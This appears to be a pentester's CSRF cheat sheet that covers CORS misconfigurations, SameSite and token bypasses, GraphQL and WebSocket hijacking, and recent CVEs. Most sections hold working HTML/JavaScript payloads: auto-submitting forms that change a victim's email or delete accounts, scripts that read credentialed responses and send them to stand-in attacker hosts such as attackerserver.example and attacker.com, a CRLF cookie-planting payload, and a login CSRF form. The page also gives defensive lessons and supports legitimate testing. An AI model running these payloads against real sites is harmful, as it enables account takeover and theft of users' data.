+++
title = 'CSRF'
date = 2026-10-30
type = 'notes'
weight = 20
toc = true
tags = ['web', 'web-attacks', 'csrf']
+++

Cross-Site Request Forgery (CSRF) tricks a victim's browser into sending an authenticated request to a web application. The browser automatically attaches cookies, so the server cannot distinguish the forged request from a legitimate one. CSRF is **not dead** — SameSite cookies reduced the classic form-POST surface, but **2025–2026 produced a steady stream of bypasses** through Content-Type parsing bugs, browser-level redirect flaws, and GraphQL/WebSocket endpoints that never had CSRF protection to begin with.

<details>
<summary>Fundamental Concepts</summary>

#### Same Origin Policy (SOP)

The Same-Origin policy is a browser security mechanism that prevents cross-origin access to websites. JavaScript running on one origin cannot access a different origin.

> The `origin` is the combination of **scheme**, **host**, and **port**. The SOP applies whenever two URLs differ in at least one of these three properties.

If a browser did not enforce SOP, site A could make cross-site requests to site B using the user's site B cookies and read authenticated responses.

> **Critical:** SOP does **not** block requests — it prevents web applications from **reading responses** from another site. A CSRF attack does not need to read the response; it only needs the request to be **sent and processed**.

#### Cross-Origin Resource Sharing (CORS)

CORS is a W3C standard that defines exceptions to SOP, allowing a server to specify which origins and HTTP methods may access its resources.

| CORS header | Exception |
|---|---|
| `Access-Control-Allow-Origin` | Specific origin or `*` |
| `Access-Control-Allow-Headers` | Allowed headers in preflight response |
| `Access-Control-Allow-Methods` | Allowed methods in preflight response |
| `Access-Control-Expose-Headers` | Specific headers exposed to the cross-origin caller |
| `Access-Control-Allow-Credentials` | If `true`, allows credentialed cross-origin requests (cookies, `Authorization`) |
| `Access-Control-Max-Age` | How long the preflight result can be cached |

#### Preflighted Requests

A **simple request** uses `GET`, `HEAD`, or `POST` with only CORS-safelisted content types: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`, and no custom headers. A `POST` form with `application/x-www-form-urlencoded` is a *simple* request and can be used for CSRF. Only non-safelisted methods or content types (e.g. `application/json`, custom headers) trigger a **preflight** (`OPTIONS`) — and since the browser waits for the preflight response, **CSRF with a preflighted request is impossible** unless the server mishandles the preflight.

> **The 2025–2026 caveat:** the "preflight protects JSON" assumption is wrong when the server parses JSON regardless of `Content-Type` (see §5) or when a framework misclassifies a form body as JSON (see §5.2).

#### CSRF Defenses and Their Pitfalls

| Defense | Pitfall |
|---|---|
| CSRF token | Only validated when present; empty token may be accepted |
| `SameSite=Lax` | Still allows top-level cross-site GETs (form GETs, `window.location`) |
| `SameSite=Strict` | Bypassable via client-side redirect (see §6.2) |
| `Referer` / `Origin` check | Bypassable with `<meta name="referrer" content="never">` or regex tricks; **fails open** when headers are absent |
| Custom header (`X-Requested-With`) | Sometimes spoofable; CORS misconfiguration may allow it |
| Double-submit cookie | Bypassable if the cookie is not `__Host-` prefixed, or if an XSS on a sibling subdomain can set the cookie |

</details>

---

## 1. Tools and Resources

- **CSRF PoC Generator:** [csrf-poc-generator.vercel.app](https://csrf-poc-generator.vercel.app/)
- **XSRFProbe** — automated CSRF audit (`xsrfprobe -u https://target`)
- **Burp Suite** — *Engagement tools → Generate CSRF PoC*; *CSRF Scanner* extension
- **Burp Sequencer** — entropy analysis for CSRF tokens (see §9)
- **Corsy** / **CORScanner** / **of-cors** / **CorsOne** — CORS misconfiguration scanners

---

## 2. Setting an Attacker HTTP Server

Modern browsers block HTTPS pages from loading resources over unencrypted HTTP, and they **reject resources from a server using a self-signed certificate**. For testing, generate a self-signed certificate and serve over HTTPS:

```bash
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

A simple Python HTTPS server that logs incoming requests and answers CORS preflights:

```python
from http import server
import ssl

class CustomRequestHandler(server.SimpleHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        super().do_GET()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        if body:
            self.log_message("[i] POST body: %s", body.decode("utf-8", errors="replace"))
        self.send_response(200)
        self.end_headers()

print("Serving HTTPS on 0.0.0.0:443 ...")
httpd = server.HTTPServer(('0.0.0.0', 443), CustomRequestHandler)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='./server.pem')
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
```

> **For same-origin CSRF testing**, the attacker page must be on a **different origin** from the target. If you test from the same host, the browser treats the request as same-origin and does not enforce SameSite — the result is a false negative.

---

## 3. Basic Payloads

### 3.1 GET request

```html
<html>
  <body>
    <form method="GET" action="https://yourtarget.com/vulnerable.php">
      <input type="hidden" name="param1" value="value1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### 3.2 POST request (form-encoded)

```html
<html>
  <body>
    <form method="POST" action="https://yourtarget.com/vulnerable.php">
      <input type="hidden" name="param1" value="value1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### 3.3 POST with JSON body (`fetch` — triggers preflight)

```html
<html>
  <body>
    <script>
      fetch("https://yourtarget.com/vulnerable.php", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ param1: "value1", param2: "value2" })
      });
    </script>
  </body>
</html>
```

> **This payload only works if the target does not enforce CORS on the endpoint** — or if the server mishandles the preflight. For a target with proper CORS, use the **text/plain JSON-as-form** technique in §5.1.

### 3.4 Hidden iframe (less visible)

```html
<html>
  <body>
    <iframe name="csrf-frame" style="display:none;"></iframe>
    <form id="csrf" action="https://TARGET/account/settings" method="POST" target="csrf-frame">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>document.getElementById('csrf').submit();</script>
  </body>
</html>
```

### 3.5 GET-based CSRF (`SameSite=Lax` still sends cookies)

Any state-changing GET endpoint is exploitable with an `<img>`, `<iframe>`, or top-level redirect — **even under `SameSite=Lax`**, because Lax allows cookies on top-level GET navigations:

```html
<!-- Fires automatically, invisible -->
<img src="https://TARGET/account/delete?confirm=true" style="display:none;">

<!-- Top-level redirect -->
<script>window.location = "https://TARGET/account/transfer?to=attacker&amount=1000";</script>
```

---

## 4. CORS Misconfigurations

### 4.1 Arbitrary origin reflection

If the server reflects an arbitrary `Origin` **and** sends `Access-Control-Allow-Credentials: true`, any attacker origin can read authenticated responses.

```bash
# Detection
curl -sI -H "Origin: https://evil.com" "https://target.com/api/user/profile" | grep -i "access-control"
```

If the response contains:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

→ **full account takeover** via cross-origin reads.

**Exploitation:**

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://misconfigured-cors.example/data.php', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://yourserver.example/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
</script>
```

> **The browser sets `Origin` automatically** to your attacker server's origin — you do not need to set it manually. The server reflects it, and `withCredentials: true` sends the victim's cookies.

### 4.2 Wildcard `*` with credentials

`Access-Control-Allow-Origin: *` **cannot** be combined with `Access-Control-Allow-Credentials: true` per the CORS spec — browsers reject it. **However**, many frameworks **echo the requesting origin** when credentials are enabled, which effectively whitelists every origin:

**CVE-2026-82287 (Rybbit < 2.7.0)** — reflects any request origin in `Access-Control-Allow-Origin` while credentials are enabled.  
**PYSEC-2026-3474 (Starlette)** — `CORS_ORIGINS=*` combined with `allow_credentials=True`; the middleware echoes the requesting origin in preflight responses.  
**CVE-2026-89058 (RESTEasy `CorsFilter`)** — configured with `*` and `Allow-Credentials: true`; any site can make credentialed requests.

```bash
# Test for origin reflection with credentials
curl -sI -H "Origin: https://evil.com" -H "Cookie: session=YOUR_TOKEN" \
  "https://target.com/api/sensitive" | grep -i "access-control"
```

If `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true` appear, the endpoint is exploitable.

### 4.3 Trusted `null` origin

Some servers trust `Access-Control-Allow-Origin: null`, which can be produced by a **sandboxed iframe**:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-vulnerable.example/cors.php', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://your-attackerserver.com/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
</script>"></iframe>
```

### 4.4 Prefix/suffix and subdomain bypasses

A whitelist that checks for a substring (`target.com`) can be bypassed with `evil-target.com`, `target.com.evil.com`, or `nottarget.com`. If the policy allows `*.target.com` and you can take over `sub.target.com`, you inherit the CORS trust.

```bash
# Prefix bypass
Origin: https://evil-target.com
# Suffix bypass
Origin: https://nottarget.com
# HTTP downgrade
Origin: http://target.com
```

### 4.5 CORS to bypass CSRF tokens

If CORS reflects an attacker origin **with credentials** and the session cookies are `SameSite=None; Secure`, you can:

1. **Read** a CSRF token from a `GET` endpoint.
2. **Submit** a state-changing request with that token.

```html
<script>
    // GET CSRF token
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://csrf-vulnerable.example/token.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
    var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

    // Exploit
    var csrf_req = new XMLHttpRequest();
    var params = `param1=value1&csrf=${csrftoken}`;
    csrf_req.open('POST', 'https://csrf-vulnerable.example/profile.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script>
```

### 4.6 Targeting internal assets

A CORS misconfiguration that trusts the attacker origin allows reading from **internal assets** (routers, admin panels, internal APIs) that the victim's browser can reach but the attacker cannot:

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://192.168.1.1/data.php', true);
    xhr.onload = () => {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://attackerserver.example/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
</script>
```

---

## 5. Content-Type Bypasses (2025–2026)

This is the **most active CSRF bypass class** in 2025–2026. Many frameworks validate CSRF tokens **only for specific content types**, or parse JSON regardless of the declared `Content-Type`. Both create a cross-origin form-POST CSRF primitive that bypasses preflight.

### 5.1 `text/plain` JSON-as-form

HTML forms cannot set `Content-Type: application/json`, but they **can** set `enctype="text/plain"` — which is a CORS-safelisted simple request and triggers **no preflight**. Many server-side parsers accept the body as JSON even when the Content-Type is `text/plain`.

```html
<form action="https://TARGET/api/account" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

The resulting body is:

```
{"email":"attacker@evil.com","ignore":"="}
```

This is **valid JSON**. The server parses the known fields and ignores the extra `ignore` key.

> **This is the single most impactful 2026 CSRF technique** — it works against any JSON API that uses a lenient parser and does not validate the `Content-Type`.

### 5.2 Incorrect Content-Type parsing — CVE-2025-64166 (Mercurius)

Mercurius (GraphQL adapter for Fastify) **misclassifies** `application/x-www-form-urlencoded`, `multipart/form-data`, and `text/plain` as `application/json`. This bypasses the `fetch()` preflight check and allows cross-origin form-POST requests to execute GraphQL operations.

```bash
# Vulnerable: Mercurius < 16.4.0
# The server sees Content-Type: application/x-www-form-urlencoded but parses it as JSON
```

**Fixed in 16.4.0.** The root cause — **substring matching** on `application/json` rather than an exact type check — reappears in other frameworks (see §5.3).

### 5.3 Substring Content-Type matching — CVE-2026-82468 (Rodauth)

Rodauth's CSRF protection **skipped token validation** whenever the `Content-Type` header **contained** the substring `application/json` — not when it was exactly `application/json`. An attacker could send:

```
Content-Type: text/application-json
Content-Type: multipart/form-data;application/json
```

Both contain the substring, so Rodauth treated the request as a JSON API call and **bypassed CSRF token validation** entirely.

**Fixed in 2.47.0.** This is a **recurring bug class** — any framework that validates `Content-Type` with `includes()` or `indexOf()` rather than an exact match is vulnerable.

### 5.4 Method override

Some frameworks accept `_method` parameters or `X-HTTP-Method-Override` headers, turning a CSRF-safe `POST` into a `DELETE` or `PUT` that was never token-protected:

```html
<form action="https://TARGET/users/delete" method="POST">
  <input type="hidden" name="username" value="admin" />
  <input type="hidden" name="_method" value="DELETE" />
</form>
```

```bash
# Or with a header (requires CORS or a simple request that allows custom headers)
X-HTTP-Method-Override: DELETE
```

---

## 6. SameSite Bypasses (2025–2026)

### 6.1 `SameSite=Lax` — top-level GET and the two-minute window

`SameSite=Lax` sends cookies on **top-level GET navigations** — `window.location`, `<a href>`, `<form method="GET">` — but not on cross-site `POST`, `<img>`, `<iframe>`, or `fetch()`. Therefore:

- **Any state-changing GET endpoint is CSRF-able under `Lax`.**
- **Method override** (`_method=PUT` in a GET) may bypass a framework that only checks the token on `POST`.
- **Chrome's “Lax+POST” two-minute window** — a cookie without an explicit `SameSite` attribute is sent on cross-site `POST` for the first **two minutes** after it is set. This is a narrow but real window.

```html
<!-- GET-based CSRF under SameSite=Lax -->
<script>window.location = "https://TARGET/account/change-email?email=attacker@evil.com";</script>
```

### 6.2 `SameSite=Strict` — client-side redirect bypass

`SameSite=Strict` cookies are not sent on **any** cross-site request — including top-level navigations. But if you can cause a **client-side redirect** (JavaScript `window.location`, `history.pushState`) **from within the target origin**, the redirect is treated as same-site and the `Strict` cookie is sent.

**The 2025–2026 pattern:** a comment-submission or profile-update feature that performs a client-side redirect after submission. The attacker injects a redirect to a state-changing endpoint, and the `Strict` cookie follows.

```
Attacker page → target page (Strict cookie not sent) → comment submission triggers client-side redirect
→ redirect target is same-site → Strict cookie IS sent → state change executes
```

> **Only client-side redirects work** — server-side `3xx` redirects are still treated as cross-site.

### 6.3 Browser-level SameSite bypass — DBSC refresh (Chromium, 2026)

A Chromium implementation flaw in **Device Bound Session Credentials (DBSC)** constructs session-refresh `POST` requests using a **low-level `net::URLRequest`** that bypasses the network service helpers. The refresh request **omits `Origin`, `Referer`, and `Sec-Fetch-*` headers**. When combined with **cross-subdomain refresh configurations**, an attacker controlling `attacker.example.com` can trigger a **credentialed `POST`** to `victim.example.com` with **`SameSite=Strict` and `__Host-` cookies** — and **no provenance headers**.

```javascript
// Conceptual — attacker on a sibling subdomain triggers a DBSC refresh
// to a victim subdomain with Strict cookies and no Origin/Referer/Sec-Fetch-*
```

> **Why this matters:** applications that rely on **header-based CSRF defenses** (`Origin`/`Referer` checks) **fail open when the headers are absent**. DBSC turns that fail-open behaviour into a full `SameSite=Strict` bypass. The fix is to **fail closed** — reject requests with missing provenance headers on state-changing endpoints.

### 6.4 `SameSite=None` — the classic surface

`SameSite=None; Secure` sends cookies on **every** cross-site request. This is the original CSRF surface and is still common on APIs that embed cross-site.

### 6.5 Subdomain XSS → SameSite bypass

If the application uses **double-submit cookies** and you have an XSS on **any sibling subdomain**, you can:

1. Write the CSRF cookie from the compromised subdomain (because cookies are shared across subdomains unless `__Host-` is used).
2. Submit a cross-site form with a matching cookie and body value.

```
evil.target.com (XSS) → document.cookie = "csrf=attacker_value"
→ cross-site POST to api.target.com with csrf=attacker_value
→ double-submit check passes
```

---

## 7. Token Bypass Techniques

### 7.1 Missing or empty token

The simplest bypass: **remove the token parameter entirely**, or send an empty value. Many frameworks only validate the token **when it is present**.

```bash
# Remove the parameter
POST /admin/users/role
username=guest&role=admin

# Empty value
POST /admin/users/role
username=guest&role=admin&csrf=
```

### 7.2 Token not bound to session

If tokens are validated against a **global pool** rather than the user session:

1. Authenticate with your own account.
2. Obtain a valid token from the pool.
3. Use that token in a CSRF attack against a **different victim**.

### 7.3 POST-to-GET method bypass

Some applications only validate CSRF on `POST`. If the same action is reachable via `GET`, the token is not checked:

```
POST /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList
__csrf_token=sid:...&widgetInfoList=[{"widgetId":"..."}]

# Bypass as GET — no token needed
GET /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList&widgetInfoList=[{...}]
```

### 7.4 Hash-collision token bypass — CVE-2026-40458 (PAC4J)

PAC4J generated CSRF tokens and compared them using **`String.hashCode()`** — a deterministic 32-bit hash. Collisions can be computed directly, reducing the effective token space to **32 bits**. An attacker does not need to know the victim's token or its hash — they craft a **colliding token** that matches the victim's hash and submit it in the forged request.

> **Fixed in 5.7.10 and 6.4.1.** The lesson: **never compare tokens by hash** — compare the full token with a constant-time equality check.

### 7.5 Weak token generation — CVE-2025-40915 (Mojolicious::Plugin::CSRF)

Mojolicious::Plugin::CSRF 1.03 generated tokens as:

```perl
md5($pid . time() . rand())
```

The process ID and time are predictable, and a single `rand()` call provides minimal entropy. An attacker who knows the process behaviour and timing can **reconstruct valid tokens**.

> **Fixed in later versions.** See §9 for the general weak-PRNG token-prediction methodology.

### 7.6 Double-submit cookie flaws

The double-submit pattern sets the CSRF token in **both a cookie and the request body**, and the server checks that they match. It fails when:

- The cookie is **not `__Host-` prefixed** — any subdomain can set it.
- The cookie is set from **any path** — a sibling app can overwrite it.
- The comparison is **not constant-time** — a timing side channel may leak the expected value.
- The server **does not validate the cookie at all** — it only checks that the body matches the cookie the attacker supplied.

---

## 8. GraphQL and WebSocket CSRF (2025–2026)

### 8.1 GraphQL GET-mutation CSRF — CVE-2026-19650 (GitLab)

GitLab's GraphQL **multiplex-query handling** validated a multiplexed request as **read-only** even when it contained a **state-changing mutation**. Because the request was sent as a **GET** (which browsers allow as a simple request, no preflight), the mutation executed cross-origin.

```
GET /api/graphql?query=mutation{mutationName(...){...}}
```

> **GraphQL GET-mutation CSRF** is a general pattern: any GraphQL endpoint that accepts `GET` requests and does not strictly **reject mutations over GET** is potentially vulnerable. **The fix is to reject mutations on `GET`** — GitLab's intended restriction existed but was bypassed by the multiplex handler.

### 8.2 GraphQL content-type confusion — CVE-2025-64166 (Mercurius)

Mercurius's Content-Type misclassification (§5.2) applies directly to GraphQL: a form-encoded `POST` that the server parses as JSON can carry a GraphQL mutation, bypassing both CORS preflight and any CSRF token check.

### 8.3 Cross-Site WebSocket Hijacking (CSWSH) — CVE-2026-55883 (Tilt)

WebSocket connections are **not protected by SOP or SameSite**. A WebSocket `Upgrade` request sends cookies **unless the server checks the `Origin` header**. If the server's `CheckOrigin` returns `true` unconditionally — or accepts clients that **omit** the `Origin` header — an attacker page can open a WebSocket to the victim's session and read/write the full stream.

**Tilt CVE-2026-55883:** the HUD WebSocket at `/ws/view` was gated by a CSRF token, but the token was served by an **unauthenticated endpoint** (`/api/websocket_token`) and the upgrader **accepted clients that omitted `Origin`**. An attacker who could reach the listener opened the HUD WebSocket and received the full view stream — session state, Tiltfile contents, resource statuses.

**CSWSH PoC:**

```javascript
// Attacker page — opens a WebSocket to the victim's authenticated session
var ws = new WebSocket("wss://target.com/ws/view");
ws.onmessage = function(event) {
    // Exfiltrate the stream
    fetch("https://attacker.com/log", { method: "POST", body: event.data });
};
```

> **The 2026 pattern:** CSWSH is **CSRF for WebSockets**. The defense is to **validate `Origin` on the `Upgrade` request** and **reject clients that omit it** — not to rely on a token served by an unauthenticated endpoint.

### 8.4 Other WebSocket CSRF — CVE-2026-85183 (Taipy)

Taipy accepted **socket.io sessions from arbitrary domains** and allowed state-variable modifications and action callbacks **without CSRF protection**. The fix requires anti-CSRF tokens on WebSocket events **regardless of source domain**.

---

## 9. Weak Token Prediction — General Methodology

The 2025–2026 weak-token bugs (§7.4, §7.5) are instances of a broader class: **non-cryptographic PRNGs** whose internal state can be reconstructed from a handful of outputs.

### 9.1 Entropy budget

Two quantities decide whether a token is guessable:

- **Seed entropy** — how many distinct internal states the generator could have started from.
- **State recoverability** — how many outputs an observer needs to reconstruct the state.

A 32-character hex token **looks** like 128 bits. If it is `md5(mt_rand())`, its real entropy is at most **32 bits** (the size of the `mt_rand()` output). If the generator was seeded from `time()`, it is closer to **20 bits** over a plausible window.

| Generator | State recovery cost |
|---|---|
| `java.util.Random` | **2 outputs** |
| Python `random` (Mersenne Twister) | **624 outputs** |
| PHP `uniqid()` | **~20 bits** of entropy — brute-forceable in ~3M hashes |
| `Math.random()` (V8) | xorshift128+ — recoverable from a few outputs |

### 9.2 Practical workflow

1. **Collect N tokens** from the application (login, form loads, reset requests).
2. **Analyze with Burp Sequencer** — entropy per character, character-level anomalies, bit-level patterns.
3. **Check for structural patterns** — sequential IDs, base64-encoded timestamps, `md5(userid)`, `md5(time())`.
4. **Attempt state recovery** — use a PRNG-specific tool (e.g. `randcrack` for Python MT, `java-random-cracker` for `java.util.Random`).
5. **Forge a token** for the victim and submit it in a CSRF PoC.

> **Burp Sequencer** is the standard tool for steps 1–2. Effective entropy **> 7.5 bits/byte** indicates unpredictable tokens; anything below 5 bits/byte is a red flag.

### 9.3 Token in URL

If the CSRF token is **in the URL** rather than the body or header, it leaks via:

- `Referer` headers to third-party resources
- Proxy and server logs
- Browser history
- Shared links

A leaked token can be **replayed** — and if it is not bound to the session, it is a direct CSRF bypass.

---

## 10. CSRF Chaining and Escalation

### 10.1 Login CSRF → activity capture

Force the victim to log into an **attacker-controlled account**. Any actions the victim then performs — saving a payment method, uploading a file, entering personal data — land in the attacker's account:

```html
<form action="https://TARGET/login" method="POST">
  <input type="hidden" name="username" value="attacker@example.com" />
  <input type="hidden" name="password" value="AttackerPass123!" />
</form>
<script>document.forms[0].submit();</script>
```

### 10.2 CSRF → self-XSS → stored XSS

If the application has a **stored XSS** that requires a state-changing request the victim would not normally make, CSRF can **force the victim to inject the payload themselves**. This turns a low-impact self-XSS into a full stored XSS.

### 10.3 CSRF → privilege escalation

Forge a mass-assignment `POST` that includes `role=admin` or `isAdmin=true`. If the server does not validate the role change separately, the CSRF grants privilege escalation.

### 10.4 CSRF → account takeover

The classic chain: **change email → trigger password reset → take over the account**. The `change-email` endpoint is the most common CSRF target because it is frequently state-changing, reachable via `GET` or form-`POST`, and rarely token-protected on legacy endpoints.

### 10.5 Clickjacking + CSRF

If the state-changing endpoint has **no frame-busting headers**, clickjacking can force the victim to click a **pre-filled form** — bypassing CSRF tokens because the request is initiated by the victim's own click.

---

## 11. Other Misconfigurations

### 11.1 Referer-based CSRF protection bypass

If the server checks the `Referer` header instead of a token:

```html
<!-- Suppress the Referer header entirely -->
<meta name="referrer" content="never">
<form action="https://TARGET/account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

Or embed the target domain in the attacker URL's query string so a naive substring check passes:

```javascript
history.pushState("", "", "?victim-domain.com");
document.forms[0].submit();
```

### 11.2 `Origin`-only checks that fail open

The DBSC bypass (§6.3) exploits a server that **checks `Origin` when present but accepts requests when it is absent**. Any header-based CSRF defense must **fail closed** — reject the request if the header is missing.

### 11.3 Double-submit cookie via CRLF injection

If the double-submit pattern compares a **cookie** and a **body value**, and you have a CRLF injection that can set cookies, you can plant a matching pair:

```html
<form action="https://example.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"
     onerror="document.forms[0].submit();" />
```

---

## 12. Quick Reference — 2025–2026 Additions

| Technique / CVE | What it bypasses | Where it lives |
|---|---|---|
| **`text/plain` JSON-as-form** | CORS preflight; JSON content-type validation | §5.1 |
| **CVE-2025-64166 (Mercurius)** | Preflight; GraphQL CSRF | §5.2, §8.2 |
| **CVE-2026-82468 (Rodauth)** | Substring `Content-Type` matching | §5.3 |
| **CVE-2026-19650 (GitLab)** | GraphQL GET-mutation restriction | §8.1 |
| **CVE-2026-55883 (Tilt)** | WebSocket `Origin` check | §8.3 |
| **CVE-2026-85183 (Taipy)** | socket.io CSRF protection | §8.4 |
| **CVE-2026-40458 (PAC4J)** | `String.hashCode()` 32-bit token space | §7.4 |
| **CVE-2025-40915 (Mojolicious)** | Weak PRNG token generation | §7.5 |
| **DBSC refresh (Chromium)** | `SameSite=Strict` + header-based CSRF (fail-open) | §6.3 |
| **Client-side redirect** | `SameSite=Strict` | §6.2 |
| **Lax+POST 2-minute window** | `SameSite=Lax` | §6.1 |
| **Subdomain XSS → double-submit** | Double-submit cookie | §6.5 |
| **CVE-2026-82287 / PYSEC-2026-3474 / CVE-2026-89058** | CORS `*` + credentials (origin echo) | §4.2 |

---

## 13. Field Notes

- **SameSite reduced the classic form-POST surface but did not kill CSRF.** The 2025–2026 bugs are in the edges: `Lax` GETs, `Strict` client-side redirects, browser-level DBSC refresh, and Content-Type confusion.
- **`text/plain` JSON-as-form is the highest-value 2026 technique.** It bypasses CORS preflight and works against any JSON API with a lenient parser.
- **Content-Type validation must be an exact match.** CVE-2025-64166 and CVE-2026-82468 are both substring-matching bugs — `includes("application/json")` is not a security control.
- **GraphQL must reject mutations on GET.** CVE-2026-19650 is a multiplex-handler bypass of that restriction.
- **WebSockets need `Origin` validation.** CSWSH is CSRF for WebSockets; a token served by an unauthenticated endpoint does not help.
- **Header-based CSRF defenses must fail closed.** The DBSC bypass works because the server accepts requests with **no `Origin`/`Referer`/`Sec-Fetch-*`** headers.
- **Never compare tokens by hash.** CVE-2026-40458 reduced a CSRF token to 32 bits by using `String.hashCode()`.
- **Analyze token entropy with Burp Sequencer.** A 32-character token from `md5(mt_rand())` has at most 32 bits of real entropy.
- **Always test from a different origin.** Testing CSRF from the same host produces false negatives because SameSite is not enforced.
- **CSRF is an account-takeover primitive, not a nuisance.** Change-email → password-reset is the most common chain; login CSRF captures victim activity in the attacker's account.

---

This file sits alongside the **XSS** and **Fuzzing** notes: XSS on a sibling subdomain defeats double-submit cookies, and the fuzzing pipeline finds the state-changing endpoints that CSRF abuses.
